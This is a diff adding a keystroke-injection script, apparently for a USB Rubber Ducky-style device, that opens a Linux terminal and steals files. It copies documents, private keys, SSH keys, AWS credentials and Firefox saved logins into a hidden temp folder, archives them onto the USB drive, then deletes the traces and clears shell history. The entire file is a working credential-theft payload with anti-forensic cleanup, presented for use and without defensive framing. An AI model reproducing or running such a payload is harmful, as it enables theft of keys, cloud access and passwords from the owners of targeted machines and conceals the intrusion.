@@ -1,0 +1,51 @@
+# ============================================
+# LINUX FILES QUICK - Grab Interesting Files
+# ============================================
+# Purpose: Find and copy interesting files
+# Time: 15 seconds
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+DELAY 2000
+
+CTRL ALT T
+DELAY 1000
+
+STRING mkdir -p /tmp/.grab
+ENTER
+DELAY 100
+
+# Find and copy interesting files
+STRING find ~ -type f \( -name "*.pdf" -o -name "*.doc*" -o -name "*.xls*" -o -name "*.key" -o -name "*.pem" -o -name "id_rsa*" \) -exec cp {} /tmp/.grab/ \; 2>/dev/null
+ENTER
+DELAY 5000
+
+# SSH keys
+STRING cp ~/.ssh/* /tmp/.grab/ 2>/dev/null
+ENTER
+DELAY 200
+
+# AWS credentials
+STRING cp ~/.aws/* /tmp/.grab/ 2>/dev/null
+ENTER
+DELAY 100
+
+# Browser data
+STRING cp -r ~/.mozilla/firefox/*/logins.json /tmp/.grab/ 2>/dev/null
+ENTER
+DELAY 100
+
+# Compress
+STRING tar czf /tmp/.grab.tar.gz -C /tmp .grab 2>/dev/null
+ENTER
+DELAY 500
+
+# Copy to USB
+STRING cp /tmp/.grab.tar.gz /media/usb/ 2>/dev/null
+ENTER
+DELAY 300
+
+STRING rm -rf /tmp/.grab /tmp/.grab.tar.gz
+ENTER
+STRING history -c; clear
+ENTER
